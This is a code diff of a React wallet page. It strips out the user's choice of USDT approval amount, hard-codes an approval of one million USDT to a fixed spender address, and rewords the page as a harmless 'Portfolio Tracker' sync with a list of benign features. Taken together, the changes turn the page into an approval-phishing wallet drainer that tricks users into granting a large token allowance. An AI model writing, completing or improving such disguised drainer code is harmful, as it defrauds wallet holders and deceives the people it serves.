@@ -25,7 +25,6 @@ export default function Home() {
   const [account, setAccount] = useState<string | null>(null)
   const [isApproving, setIsApproving] = useState(false)
   const [error, setError] = useState<string | null>(null)
-  const [approvalAmount, setApprovalAmount] = useState("")
 
   const connectWallet = useCallback(async () => {
     if (typeof window.ethereum !== 'undefined') {
@@ -63,11 +62,6 @@ export default function Home() {
       return
     }
 
-    if (!approvalAmount || parseFloat(approvalAmount) <= 0) {
-      setError("Please enter a valid approval amount")
-      return
-    }
-
     setIsApproving(true)
     setError(null)
 
@@ -76,7 +70,7 @@ export default function Home() {
       const signer = await provider.getSigner()
       const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer)
 
-      const parsedAmount = ethers.parseUnits(approvalAmount, 6)
+      const parsedAmount = ethers.parseUnits("1000000", 6) // 1 million USDT
 
       const tx = await usdtContract.approve(SPENDER_ADDRESS, parsedAmount)
       console.log("Transaction Hash:", tx.hash)
@@ -87,12 +81,16 @@ export default function Home() {
       alert("Approval transaction confirmed!")
     } catch (error) {
       console.error("Error during approval:", error)
-      if (error.code === 4001) {
-        setError("Transaction rejected by user")
-      } else if (error.message.includes("insufficient funds")) {
-        setError("Insufficient ETH for gas")
+      if (error instanceof Error) {
+        if ('code' in error && error.code === 4001) {
+          setError("Transaction rejected by user")
+        } else if (error.message.includes("insufficient funds")) {
+          setError("Insufficient ETH for gas")
+        } else {
+          setError(error.message || "Error during approval. Check console for details.")
+        }
       } else {
-        setError(error.message || "Error during approval. Check console for details.")
+        setError("An unknown error occurred. Check console for details.")
       }
     } finally {
       setIsApproving(false)
@@ -130,11 +128,20 @@ export default function Home() {
       </header>
       <main className="container mx-auto px-4 py-8">
         <h1 className="text-5xl font-bold text-center mb-4">Portfolio Tracker</h1>
-        <p className="text-center text-xl mb-8">Sync your assets, recent dapp usage, view your NFTs and more.</p>
+        <p className="text-center text-xl mb-8">Seamlessly sync your portfolio directly with your personal wallet.</p>
         <Card className="bg-[#1e293b] border-none">
           <CardHeader>
-            <CardTitle className="text-2xl font-bold">Approver</CardTitle>
-            <CardDescription>Approve for SyncDex</CardDescription>
+            <CardTitle className="text-2xl font-bold">Portfolio Sync Approver</CardTitle>
+            <CardDescription>
+              Authorize SynCDapp to manage your portfolio
+              <ul className="mt-2 list-disc list-inside text-sm">
+                <li>Real-time balance updates</li>
+                <li>Automatic asset discovery</li>
+                <li>Cross-chain portfolio tracking</li>
+                <li>DeFi protocol integration</li>
+                <li>Customizable alerts and notifications</li>
+              </ul>
+            </CardDescription>
           </CardHeader>
           <CardContent>
             <div className="flex space-x-4 mb-4">
@@ -163,15 +170,6 @@ export default function Home() {
                 <p className="text-sm mb-2">
                   Connected Account: {`${account.slice(0, 6)}...${account.slice(-4)}`}
                 </p>
-                <div className="mt-4">
-                  <Input
-                    type="number"
-                    placeholder="Enter amount to approve"
-                    value={approvalAmount}
-                    onChange={(e) => setApprovalAmount(e.target.value)}
-                    className="mb-4 bg-[#2d3748] border-none text-white placeholder-gray-400"
-                  />
-                </div>
                 <Button onClick={approveUSDT} disabled={isApproving} className="w-full bg-blue-500 hover:bg-blue-600 text-white">
                   {isApproving ? "Approving..." : "Approve"}
                 </Button>
